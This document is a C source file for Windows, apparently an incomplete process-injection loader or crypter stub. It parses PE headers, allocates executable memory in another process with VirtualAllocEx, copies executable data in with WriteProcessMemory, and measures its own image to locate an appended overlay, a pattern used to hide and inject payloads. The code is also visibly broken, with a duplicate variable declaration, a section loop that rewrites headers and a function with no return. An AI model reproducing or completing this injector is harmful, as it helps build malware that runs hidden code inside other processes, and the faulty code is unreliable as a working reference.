#include <windows.h>
#include <TlHelp32.h> 

struct Executable{
    int executableSize;
    char *executableData;
} executable, *executablePtr;

//align size according to aligment
size_t alignSize(DWORD aligment, DWORD size){
    return (size_t)(((size / aligment) + 1) * aligment);
}

int loadPeToRemoteProcess(struct Executable *executable, HANDLE hProcess){
    //parse DOS and PE header
    IMAGE_DOS_HEADER* IDH = (IMAGE_DOS_HEADER*)executable->executableData;
    IMAGE_NT_HEADERS* INH = (IMAGE_NT_HEADERS*)((int)executable->executableData + IDH->e_lfanew);

    DWORD sectionAlligmnet = INH->OptionalHeader.SectionAlignment;
    DWORD fileAlligment = INH->OptionalHeader.FileAlignment;

    LPVOID remoteProcessAddress = NULL;
    //allocate memory in remote process for header
    LPVOID remoteProcessAddress = VirtualAllocEx(hProcess, remoteProcessAddress, alignSize(sectionAlligmnet, INH->OptionalHeader.SizeOfHeaders), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (remoteProcessAddress == NULL){
        perror("Injection failed. Could not allocate memory in remote process.\n");
        exit(EXIT_FAILURE);
    } 

    if (WriteProcessMemory(hProcess, remoteProcessAddress, executable->executableData, alignSize(sectionAlligmnet, INH->OptionalHeader.SizeOfHeaders), NULL) == 0){
        perror("Injection failed. Could not write to remote process.\n");
        exit(EXIT_FAILURE);
    }

    DWORD sectionLocation = (DWORD)INH + sizeof(DWORD) /*PE signature*/ + (DWORD)(sizeof(IMAGE_FILE_HEADER)) + (DWORD)INH->FileHeader.SizeOfOptionalHeader;
    DWORD sectionSize = (DWORD)sizeof(IMAGE_SECTION_HEADER); //40 bytes
    for (int i = 0; i < INH->FileHeader.NumberOfSections; i++) {    //loop through all sections 
        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)sectionLocation;
        //
        remoteProcessAddress = VirtualAllocEx(hProcess, remoteProcessAddress, alignSize(sectionAlligmnet, INH->OptionalHeader.SizeOfHeaders), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (remoteProcessAddress == NULL){
            perror("Injection failed. Could not allocate memory in remote process.\n");
            exit(EXIT_FAILURE);
        } 

        if (WriteProcessMemory(hProcess, remoteProcessAddress, executable->executableData, INH->OptionalHeader.SizeOfHeaders, NULL) == 0){
            perror("Injection failed. Could not write to remote process.\n");
            exit(EXIT_FAILURE);
        }
        //
        sectionLocation = sectionLocation +sectionSize;
    }    
}

//get offset of overlay
int getExecutableEntryPoint(struct Executable *executable){
    IMAGE_DOS_HEADER* IDH = (IMAGE_DOS_HEADER*)executable->executableData;
    IMAGE_NT_HEADERS* INH = (IMAGE_NT_HEADERS*)((int)executable->executableData + IDH->e_lfanew);
    return INH->OptionalHeader.AddressOfEntryPoint;
}  

//get offset of overlay
int getSizeOfPeFile(){
    HMODULE baseAddress = GetModuleHandle(NULL);
    IMAGE_DOS_HEADER* IDH = (IMAGE_DOS_HEADER*)baseAddress;
    IMAGE_NT_HEADERS* INH = (IMAGE_NT_HEADERS*)((int)baseAddress + IDH->e_lfanew);
    int size = INH->OptionalHeader.SizeOfHeaders;
    DWORD sectionLocation = (DWORD)INH + sizeof(DWORD) /*PE signature*/ + (DWORD)(sizeof(IMAGE_FILE_HEADER)) + (DWORD)INH->FileHeader.SizeOfOptionalHeader;
    DWORD sectionSize = (DWORD)sizeof(IMAGE_SECTION_HEADER); //40 bytes
    for (int i = 0; i < INH->FileHeader.NumberOfSections; i++) {    //loop through all sections and adds its sizes
        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)sectionLocation;
        size = size + sectionHeader->SizeOfRawData;
        sectionLocation = sectionLocation +sectionSize;
    }
    return size;
}   
